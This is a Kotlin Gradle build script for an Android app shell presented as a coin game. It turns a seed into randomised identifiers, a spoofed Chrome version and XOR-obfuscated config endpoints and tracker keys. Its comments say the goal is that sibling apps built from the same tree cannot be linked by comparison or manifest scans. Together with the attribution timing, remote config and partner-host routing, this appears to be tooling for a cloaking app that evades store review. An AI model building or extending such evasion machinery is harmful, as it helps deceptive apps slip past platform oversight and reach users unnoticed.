import java.security.MessageDigest
import java.security.SecureRandom
import java.util.Base64
import java.util.Properties

plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
    id("com.google.gms.google-services")
}

// ═════════════════════════════════════════════════════════════════════════════
//  Shell configuration and per-application derivation.
//
//  pulse.properties holds one seed plus the credentials. Everything the shell
//  reads at runtime — preference file names, every key inside them, the JS
//  sentinels and bridge name, the notification channel, every timeout, the
//  cipher parameters and the Chrome version it presents — is drawn from that
//  seed here, at build time, and reaches the code only through BuildConfig.
//  The derivation itself never ships, so the APK carries results without the
//  recipe that produced them, and no two applications built from this tree
//  share a single one of those values.
// ═════════════════════════════════════════════════════════════════════════════

val shellFile = rootProject.file("pulse.properties")
val shellCfg = Properties().apply {
    if (shellFile.exists()) shellFile.inputStream().use { load(it) }
}
fun cfg(key: String, fallback: String = ""): String =
    (shellCfg.getProperty(key) ?: fallback).trim()

val shellSeed      = cfg("shell.seed", "CHANGE-ME-PER-APP")
val shellBundle    = cfg("shell.bundleId", "com.coinpulse.coinpulsegame")
val shellVerCode   = cfg("shell.versionCode", "1").toInt()
val shellVerName   = cfg("shell.versionName", "1.0.0")

if (shellSeed == "CHANGE-ME-PER-APP") {
    logger.warn(
        "[shell] pulse.properties is missing or shell.seed is still the default. " +
        "The build succeeds, but every derived identifier is the template value " +
        "and must not be shipped. Run `./gradlew shellSeed` and paste the result in."
    )
}
if (cfg("shell.allowedHosts").isBlank()) {
    logger.warn(
        "[shell] shell.allowedHosts is empty — every URL the endpoint or a push " +
        "names will be accepted. Fill it with the partner hosts before release."
    )
}

// A Firebase file belonging to another application, or a stand-in left over from
// bring-up, fails quietly: the build succeeds, push registers against a project
// that will never send to it, and the store reads a project id that is not ours.
// A warning is easy to walk past, so anything heading for the store stops here.
val buildingForStore = gradle.startParameter.taskNames.any {
    it.contains("Release", ignoreCase = true) || it.contains("bundle", ignoreCase = true)
}
fun onServicesFault(complaint: String) {
    if (buildingForStore) throw GradleException("[shell] $complaint") else logger.warn("[shell] $complaint")
}

val servicesFile = project.file("google-services.json")
if (!servicesFile.exists()) {
    logger.warn(
        "[shell] app/google-services.json is missing — the messaging plugin will " +
        "stop the build. Use the file from this application's own Firebase project."
    )
} else {
    val servicesText = servicesFile.readText()
    if (servicesText.contains("placeholder-not-for-release")) {
        onServicesFault(
            "app/google-services.json is the stand-in written to verify the build. " +
            "Push cannot work with it and the project id inside is not real. " +
            "Replace it with this application's own Firebase file."
        )
    }
    val declared = Regex("\"package_name\"\\s*:\\s*\"([^\"]+)\"")
        .findAll(servicesText).map { it.groupValues[1] }.toList()
    if (declared.isNotEmpty() && shellBundle !in declared) {
        onServicesFault(
            "app/google-services.json names ${declared.joinToString()} but this " +
            "application is $shellBundle. A mismatch leaves push dead and is what " +
            "a manifest scan reports as an unrelated project."
        )
    }
}

// ─── Deterministic draw ──────────────────────────────────────────────────────
// A stretched SHA-512 of the seed starts an xorshift64* generator. Same seed,
// same build, forever; one character of difference and nothing lines up.
var drawState: Long = run {
    var digest = MessageDigest.getInstance("SHA-512")
        .digest(("coin-pulse-shell/" + shellSeed).toByteArray(Charsets.UTF_8))
    repeat(3) { digest = MessageDigest.getInstance("SHA-512").digest(digest) }
    val folded = (0 until 8).fold(0L) { acc, i ->
        (acc shl 8) or (digest[i * 7].toLong() and 0xFF)
    }
    if (folded == 0L) -0x61c8864680b583ebL else folded
}

fun draw(): Long {
    var x = drawState
    x = x xor (x shl 13)
    x = x xor (x ushr 7)
    x = x xor (x shl 17)
    drawState = x
    return x * -0x61c8864680b583ebL
}

fun span(from: Int, to: Int): Int = ((draw() ushr 1) % (to - from + 1L)).toInt() + from
fun span(from: Long, to: Long): Long = (draw() ushr 1) % (to - from + 1L) + from
fun oneOf(items: List<String>): String = items[span(0, items.size - 1)]
fun token(minLen: Int, maxLen: Int): String {
    val alphabet = ('a'..'z') + ('0'..'9')
    return (1..span(minLen, maxLen)).joinToString("") { alphabet[span(0, alphabet.size - 1)].toString() }
}

/** A token that can stand as a JavaScript identifier: never digit-first. */
fun word(minLen: Int, maxLen: Int): String {
    val letters = ('a'..'z').toList()
    return letters[span(0, letters.size - 1)] + token(minLen - 1, maxLen - 1)
}

// ─── Derived: cipher ─────────────────────────────────────────────────────────
// A keystream byte is the seed block xored with a rotated ramp, and each output
// byte is chained into the next, so an identical plaintext in two builds shares
// no byte and no run length with its sibling.
val sealBytes: IntArray = IntArray(span(28, 44)) { span(0, 255) }
val sealStep: Int = span(5, 251) or 1
val sealBias: Int = span(1, 254)

fun keyStreamAt(index: Int): Int {
    val block = sealBytes[index % sealBytes.size] and 0xFF
    val ramp = ((index * sealStep) + sealBias + (index / sealBytes.size)) and 0xFF
    val turn = index % 5
    val rolled = ((ramp shl turn) or (ramp ushr (8 - turn))) and 0xFF
    return block xor rolled
}

fun sealed(text: String): String {
    if (text.isBlank()) return "new int[0]"
    var carry = sealBias and 0xFF
    val out = text.toByteArray(Charsets.UTF_8).mapIndexed { i, raw ->
        val enc = ((raw.toInt() and 0xFF) xor keyStreamAt(i) xor carry) and 0xFF
        carry = enc
        "0x%02X".format(enc)
    }
    return "new int[]{${out.joinToString(",")}}"
}

fun quoted(value: String): String =
    "\"" + value.replace("\\", "\\\\").replace("\"", "\\\"") + "\""

// ─── Derived: names, marks, timings ──────────────────────────────────────────
val boxMain   = token(7, 11) + "_p"
val boxSealed = token(7, 11) + "_s"

val tagMode    = token(5, 9)
val tagTarget  = token(5, 9)
val tagTtl     = token(5, 9)
val tagPush    = token(5, 9)
val tagAskAt   = token(5, 9)
val tagAskOk   = token(5, 9)
val tagAskNo   = token(5, 9)
val tagToken   = token(5, 9)
val tagImeUp   = token(5, 9)
val tagImeWide = token(5, 9)

val markEdge = "_" + word(5, 9)
val markIme  = "_" + word(5, 9)
val bridgeId = word(6, 10).replaceFirstChar { it.uppercase() }

val alertChannel = token(8, 12)
// The words a user sees in the system notification settings. Deliberately clear
// of the set a shell of this lineage normally draws from ("Promotions",
// "Bonuses", "Updates", "Offers", "Announcements", "Rewards", "Deals", "News"):
// a title picked from the same seven-or-eight words is one comparison away from
// naming every application built the same way, whatever the seed did.
val alertChannelName = oneOf(
    listOf("Prizes", "Events", "Highlights", "Milestones", "Challenges", "Streaks")
)

// Two to seven days, drawn from the seed. A round three days is what the Flutter
// reference used, and every application that copied it carries that same second
// count — the one timing on this list a comparison can name without a seed.
val askAgainSec   = span(2L * 86_400L, 7L * 86_400L)
val organicPause  = span(4_000L, 7_000L)
val cfgWait       = span(12_000L, 20_000L)
val attrCold      = span(24_000L, 36_000L)
val attrWarm      = span(8_000L, 13_000L)
val linkWait      = span(4_000L, 6_500L)
val gcdWait       = span(8_000L, 13_000L)
val netGrace      = span(2_800L, 4_800L)
val edgeDelay     = span(600L, 1_300L)
val pulseWait     = span(3_400L, 6_000L)
val hopBudget     = span(5, 8)

// Drawn, not pinned. A fixed major is shared by every build that hardcodes the
// same plausible number, and the milestones just below this range are the ones
// already in circulation; these sit a few releases later, where this build's
// own shipping window actually is.
val uaMajor = span(151, 154)
val uaBuild = span(6_950, 7_850)
val uaPatch = span(45, 240)

// ─── Signing ─────────────────────────────────────────────────────────────────
val keystorePropsFile = rootProject.file("keystore.properties")
val keystoreProps = Properties().also {
    if (keystorePropsFile.exists()) it.load(keystorePropsFile.inputStream())
}
val canSign = keystorePropsFile.exists()

android {
    namespace = "com.coinpulse.coinpulsegame"
    compileSdk = 36

    defaultConfig {
        applicationId = shellBundle
        minSdk = 26
        targetSdk = 36
        versionCode = shellVerCode
        versionName = shellVerName

        manifestPlaceholders["alertChannel"]   = alertChannel

        buildConfigField("String",  "SHELL_ID",     quoted(shellBundle))
        buildConfigField("String",  "SHELL_TAG",    quoted(cfg("shell.uaTailToken", "App")))
        buildConfigField("boolean", "UA_TAIL",      (cfg("shell.uaTail", "false") == "true").toString())

        buildConfigField("int[]", "HID_CFG",   sealed(cfg("shell.configEndpoint")))
        buildConfigField("int[]", "HID_TRACK", sealed(cfg("shell.trackerKey")))
        buildConfigField("int[]", "HID_FB",    sealed(cfg("shell.analyticsProject")))
        buildConfigField("int[]", "HID_GCD",   sealed(cfg("shell.gcdBase")))

        buildConfigField(
            "int[]", "SEAL_BYTES",
            "new int[]{${sealBytes.joinToString(",") { "0x%02X".format(it) }}}"
        )
        buildConfigField("int", "SEAL_STEP", sealStep.toString())
        buildConfigField("int", "SEAL_BIAS", sealBias.toString())

        buildConfigField("String", "BOX_MAIN",   quoted(boxMain))
        buildConfigField("String", "BOX_SEALED", quoted(boxSealed))

        buildConfigField("String", "TAG_MODE",     quoted(tagMode))
        buildConfigField("String", "TAG_TARGET",   quoted(tagTarget))
        buildConfigField("String", "TAG_TTL",      quoted(tagTtl))
        buildConfigField("String", "TAG_PUSH",     quoted(tagPush))
        buildConfigField("String", "TAG_ASK_AT",   quoted(tagAskAt))
        buildConfigField("String", "TAG_ASK_OK",   quoted(tagAskOk))
        buildConfigField("String", "TAG_ASK_NO",   quoted(tagAskNo))
        buildConfigField("String", "TAG_TOKEN",    quoted(tagToken))
        buildConfigField("String", "TAG_IME_UP",   quoted(tagImeUp))
        buildConfigField("String", "TAG_IME_WIDE", quoted(tagImeWide))

        buildConfigField("String", "MARK_EDGE", quoted(markEdge))
        buildConfigField("String", "MARK_IME",  quoted(markIme))
        buildConfigField("String", "BRIDGE_ID", quoted(bridgeId))

        buildConfigField("String", "ALERT_CHANNEL",      quoted(alertChannel))
        buildConfigField("String", "ALERT_CHANNEL_NAME", quoted(alertChannelName))

        buildConfigField("long", "ASK_AGAIN_SEC",    "${askAgainSec}L")
        buildConfigField("long", "ORGANIC_PAUSE_MS", "${organicPause}L")
        buildConfigField("long", "CFG_WAIT_MS",      "${cfgWait}L")
        buildConfigField("long", "ATTR_COLD_MS",     "${attrCold}L")
        buildConfigField("long", "ATTR_WARM_MS",     "${attrWarm}L")
        buildConfigField("long", "LINK_WAIT_MS",     "${linkWait}L")
        buildConfigField("long", "GCD_WAIT_MS",      "${gcdWait}L")
        buildConfigField("long", "NET_GRACE_MS",     "${netGrace}L")
        buildConfigField("long", "EDGE_DELAY_MS",    "${edgeDelay}L")
        buildConfigField("long", "PULSE_MS",         "${pulseWait}L")
        buildConfigField("int",  "HOP_BUDGET",       hopBudget.toString())

        buildConfigField("int", "UA_MAJOR", uaMajor.toString())
        buildConfigField("int", "UA_BUILD", uaBuild.toString())
        buildConfigField("int", "UA_PATCH", uaPatch.toString())

        buildConfigField("String", "HOST_LIST", quoted(cfg("shell.allowedHosts")))
    }

    signingConfigs {
        if (canSign) create("release") {
            storeFile     = file(keystoreProps["storeFile"] as String)
            storePassword = keystoreProps["storePassword"] as String
            keyAlias      = keystoreProps["keyAlias"] as String
            keyPassword   = keystoreProps["keyPassword"] as String
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
            if (canSign) signingConfig = signingConfigs.getByName("release")
            // A forced URL can never reach a release build, whatever the file says.
            buildConfigField("String", "FORCE_URL", "\"\"")
        }
        debug {
            // Never applicationIdSuffix: AppsFlyer and Firebase are registered for
            // the real package, and a suffixed one is invisible to both.
            versionNameSuffix = "-debug"
            buildConfigField("String", "FORCE_URL", quoted(cfg("shell.forceUrl")))
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    kotlinOptions {
        jvmTarget = "17"
    }

    buildFeatures {
        viewBinding = true
        buildConfig = true
    }

    bundle {
        language { enableSplit = true }
        density { enableSplit = true }
        abi { enableSplit = true }
    }

    // Rename release outputs: coinpulse-1.0.4.apk / coinpulse-1.0.4.aab. The name
    // is the game's, not the shell's: an artefact called after the tooling that
    // produced it names every other artefact produced the same way.
    applicationVariants.all {
        val variant = this
        outputs.all {
            val out = this as com.android.build.gradle.internal.api.BaseVariantOutputImpl
            if (variant.buildType.name == "release") {
                out.outputFileName = "coinpulse-${variant.versionName}.apk"
            }
        }
    }
}

tasks.whenTaskAdded {
    if (name == "bundleRelease") {
        doLast {
            val outDir = File(layout.buildDirectory.get().asFile, "outputs/bundle/release")
            // Only rename the Gradle-generated output (app-release.aab), not an
            // already-renamed file from a previous run. Without this guard a
            // second build would find both files, rename app-release.aab to
            // the target, then delete the target when processing the old named
            // file — leaving nothing in the directory.
            val src = File(outDir, "app-release.aab")
            if (src.exists()) {
                val ver = android.defaultConfig.versionName
                val target = File(outDir, "coinpulse-${ver}.aab")
                if (target.exists()) target.delete()
                src.renameTo(target)
            }
        }
    }
}

dependencies {
    implementation("androidx.core:core-ktx:1.15.0")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("com.google.android.material:material:1.12.0")
    implementation("androidx.constraintlayout:constraintlayout:2.1.4")
    implementation("androidx.activity:activity-ktx:1.10.1")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.7")
    implementation("androidx.lifecycle:lifecycle-viewmodel-ktx:2.8.7")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.10.2")
    implementation("androidx.datastore:datastore-preferences:1.1.1")

    implementation(platform("com.google.firebase:firebase-bom:34.16.0"))
    implementation("com.google.firebase:firebase-messaging")
    implementation("com.google.firebase:firebase-appcheck-playintegrity")
    implementation("com.google.firebase:firebase-appcheck-debug")

    implementation("com.appsflyer:af-android-sdk:6.18.1")
    implementation("com.android.installreferrer:installreferrer:2.2")
}

// ─── Operator tasks ──────────────────────────────────────────────────────────

tasks.register("shellSeed") {
    group = "coin pulse shell"
    description = "Print a fresh seed for pulse.properties. Nothing is written to disk."
    doLast {
        val bytes = ByteArray(24)
        SecureRandom().nextBytes(bytes)
        println("shell.seed = " + Base64.getUrlEncoder().withoutPadding().encodeToString(bytes))
    }
}

tasks.register("shellReport") {
    group = "coin pulse shell"
    description = "Print the derived per-application values. Do not commit the output."
    doLast {
        println("── derived from seed ${shellSeed.take(6)}… ──")
        println("applicationId   = $shellBundle")
        println("prefs           = $boxMain / $boxSealed")
        println("mode key        = $tagMode")
        println("target key      = $tagTarget")
        println("channel         = $alertChannel ($alertChannelName)")
        println("marks           = $markEdge / $markIme   bridge=$bridgeId")
        println("cipher          = step $sealStep bias $sealBias over ${sealBytes.size} bytes")
        println("waits ms        = cfg $cfgWait / cold $attrCold / warm $attrWarm / gcd $gcdWait")
        println("ask again sec   = $askAgainSec")
        println("hop budget      = $hopBudget")
        println("chrome          = $uaMajor.0.$uaBuild.$uaPatch")
    }
}
